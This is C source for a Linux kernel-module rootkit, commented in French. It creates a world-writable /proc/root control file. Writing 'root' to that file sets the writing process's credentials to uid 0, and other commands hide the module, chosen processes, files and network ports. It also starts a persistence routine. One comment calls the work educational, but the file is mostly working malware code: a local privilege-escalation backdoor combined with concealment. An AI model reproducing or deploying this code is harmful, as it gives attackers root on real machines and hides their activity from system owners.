#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/pid.h>
#include <linux/uaccess.h>
#include <linux/proc_fs.h>
#include "hide.h"
#include "hide_file.h"
#include "hide_net.h"
#include "persistence.h"

/*
 * grant_root: élève les credentials du processus courant (celui qui écrit
 * dans /proc/root) à uid/gid 0.  L'ancien code acceptait un PID cible mais
 * commit_creds() s'applique toujours au processus courant — on garde donc
 * uniquement le mode "self".  Pour élever un autre processus il faudrait
 * modifier directement sa struct cred via task_cred_xxx(), ce qui est plus
 * complexe et hors périmètre éducatif.
 */
static void grant_root(void)
{
    struct cred *new_cred = prepare_creds();

    if (!new_cred) {
        printk(KERN_ERR "prepare_creds a échoué\n");
        return;
    }

    new_cred->uid.val   = 0;
    new_cred->gid.val   = 0;
    new_cred->euid.val  = 0;
    new_cred->egid.val  = 0;
    new_cred->suid.val  = 0;
    new_cred->sgid.val  = 0;
    new_cred->fsuid.val = 0;
    new_cred->fsgid.val = 0;

    commit_creds(new_cred);
    printk(KERN_INFO "root donné au pid %d\n", current->pid);
}

static ssize_t write_pid(struct file *file, const char __user *buf,
                         size_t count, loff_t *ppos)
{
    char kbuf[256];
    char *name;
    int len;

    if (count > 255)
        return -EINVAL;

    if (copy_from_user(kbuf, buf, count))
        return -EFAULT;

    kbuf[count] = '\0';

    /* strip trailing newline */
    len = strlen(kbuf);
    if (len > 0 && kbuf[len - 1] == '\n')
        kbuf[--len] = '\0';

#define CMD(s) (strncmp(kbuf, (s), sizeof(s) - 1) == 0)
#define ARG(s) (kbuf + sizeof(s) - 1)

    if (CMD("hide") && len == 4)        { set_hide();          return count; }
    if (CMD("show") && len == 4)        { unset_hide();        return count; }
    if (CMD("root"))                     { grant_root();        return count; }

    if (CMD("hideproc:"))  { set_hidden_pid(simple_strtoul(ARG("hideproc:"),  NULL, 10)); return count; }
    if (CMD("clearprocs")) { clear_hidden_pids();   return count; }

    if (CMD("hidefile:"))  { set_hidden_file(ARG("hidefile:"));  return count; }
    if (CMD("clearfiles")) { clear_hidden_files();  return count; }

    if (CMD("hideport:"))  { set_hidden_port(simple_strtoul(ARG("hideport:"), NULL, 10)); return count; }
    if (CMD("clearports")) { clear_hidden_ports();  return count; }

#undef CMD
#undef ARG

    printk(KERN_WARNING "commande inconnue: %s\n", kbuf);
    return count;
}

static struct proc_ops proc_fops = {
    .proc_write = write_pid,
};

static struct proc_dir_entry *proc_entry;

static int __init rootkit_init(void)
{
    int err;

    printk(KERN_INFO "chargé\n");

    proc_entry = proc_create("root", 0222, NULL, &proc_fops);
    if (!proc_entry) {
        printk(KERN_ERR "impossible de créer /proc/root\n");
        return -ENOMEM;
    }

    err = hide_file_init();
    if (err) {
        remove_proc_entry("root", NULL);
        return err;
    }

    err = hide_net_init();
    if (err) {
        hide_file_exit();
        remove_proc_entry("root", NULL);
        return err;
    }

    err = persistence_init();
    if (err)
        printk(KERN_WARNING "persistence a échoué (%d), on continue quand meme\n", err);

    return 0;
}

static void __exit rootkit_exit(void)
{
    persistence_exit();
    hide_net_exit();
    hide_file_exit();
    unset_hide();
    remove_proc_entry("root", NULL);
    printk(KERN_INFO "module déchargé\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ME");
